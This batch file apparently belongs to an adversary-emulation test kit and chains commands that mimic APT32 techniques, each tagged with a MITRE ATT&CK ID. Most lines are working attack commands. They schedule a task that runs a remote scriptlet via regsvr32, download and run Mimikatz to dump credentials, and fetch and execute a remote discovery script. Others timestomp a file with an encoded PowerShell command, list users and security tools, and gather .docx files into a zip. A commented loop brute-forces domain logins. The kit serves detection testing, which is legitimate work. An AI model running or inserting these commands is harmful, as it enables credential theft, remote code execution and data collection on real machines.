:: Adversary Group: https://attack.mitre.org/wiki/Group/G0050
:: xref: https://www.fireeye.com/blog/threat-research/2017/05/cyber-espionage-apt32.html
:: Thanks to Nick Carr for his research on this group
:: Sample Representation of ATT&CK Techniques used by APT32
:: Tactics: Execution, Persistence, Privilege Escalation


:: Tactic: Privilege Escalation / Execution
:: Technique: Scheduled Task https://attack.mitre.org/wiki/Technique/T1053
:: Create Scheduled Task With RegSv32 Payload

SCHTASKS /Create /SC MINUTE /TN "Atomic Testing" /TR "regsvr32.exe /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/6965fc15ef872281346d99d5eea952907167dec3/atomics/T1117/RegSvr32.sct scrobj.dll" /mo 30

SCHTASKS /Run /TN "Atomic Testing"

SCHTASKS /Delete /TN "Atomic Testing" /F

:: Tactics: Execution
:: Technique: PowerShell https://attack.mitre.org/wiki/Technique/T1086

powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/dev/data/module_source/credentials/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"

:: Tactics: Defense Evasion
:: Technique: Timestomp https://attack.mitre.org/wiki/Technique/T1099
:: Source: https://gist.github.com/obscuresec/7b0cf71d7a8dd5e7b54c
:: To Encode A Command
:: $Text = '$file=(gi test.txt);$date=''7/16/1945 5:29am'';$file.LastWriteTime=$date;$file.LastAccessTime=$date;$file.CreationTime=$date'
:: $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
:: $EncodedText =[Convert]::ToBase64String($Bytes)
:: $EncodedText

echo "Atomic Test File" > test.txt

::PowerShell.exe -com {$file=(gi test.txt);$date = '7/16/1945 5:29am';$file.LastWriteTime=$date;$file.LastAccessTime=$date;$file.CreationTime=$date}

PowerShell.exe -enc JABmAGkAbABlAD0AKABnAGkAIAB0AGUAcwB0AC4AdAB4AHQAKQA7ACQAZABhAHQAZQA9ACcANwAvADEANgAvADEAOQA0ADUAIAA1ADoAMgA5AGEAbQAnADsAJABmAGkAbABlAC4ATABhAHMAdABXAHIAaQB0AGUAVABpAG0AZQA9ACQAZABhAHQAZQA7ACQAZgBpAGwAZQAuAEwAYQBzAHQAQQBjAGMAZQBzAHMAVABpAG0AZQA9ACQAZABhAHQAZQA7ACQAZgBpAGwAZQAuAEMAcgBlAGEAdABpAG8AbgBUAGkAbQBlAD0AJABkAGEAdABlAA==

:: Tactics: Defense Evasion
:: technique: File Deletion https://attack.mitre.org/wiki/Technique/T1107

:: Deletes File, detection here would be File Modification
::del test.txt

:: Chain Reaction - Reactor
::
::

:: Tactic: Discovery
:: Technique: System Owner/User Discovery: https://attack.mitre.org/wiki/Technique/T1033

:: Single Endpoint

@FOR /F "tokens=1,2" %%i in ('qwinsta /server:<COMPUTERNAME> ^| findstr "Active Disc"') do @echo %%i | find /v "#" | find /v "console" || echo %%j > usernames.txt

:: Multiple Endpoints

:: for /F %%n in (computers.txt) DO @FOR /F "tokens=1,2" %%i in ('qwinsta /server:%%n ^| findstr "Active Disc"’) do @echo %%i | find /v "#" | find /v "console" || echo %%j > usernames.txt


:: Tactic: Credential Access, Lateral Movement
:: Technique: Brute Force: https://attack.mitre.org/wiki/Technique/T1110
:: Technique: Windows Admin Shares: https://attack.mitre.org/wiki/Technique/T1077

::@FOR /F %%n in (usernames.txt) DO @FOR /F %%p in (passwords.txt) DO @net use \\COMPANYDC1\IPC$ /user:COMPANY\%%n %%p 1>NUL 2>&1 && @echo [*] %%n:%%p && @net use /delete \\COMPANYDC1\IPC$ > NUL


:: Tactic: Discovery
:: Technique: Security Software Discovery: https://attack.mitre.org/wiki/Technique/T1063

netsh.exe advfirewall firewall show rule name=all

tasklist.exe | findstr cb

tasklist.exe | findstr virus

tasklist.exe | findstr defender

:: Tactic: Execution, Discovery
:: Technique: PowerShell: https://attack.mitre.org/wiki/Technique/T1086
:: Technique: Multiple Discovery

powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Jerome99/atomic-red-team/master/ARTifacts/Misc/Discovery.bat')"

:: Tactic: Collection
:: Technique: Automated Collection: https://attack.mitre.org/wiki/Technique/T1119

for /R c: %%f in (*.docx) do copy %%f c:\temp\

:: Tactic: Exfiltration
:: Technique: Data Compressed: https://attack.mitre.org/wiki/Technique/T1002

cmd.exe /c powershell.exe Compress-Archive -Path C:\temp\* -CompressionLevel Optimal -DestinationPath C:\temp\allthedataz.zip
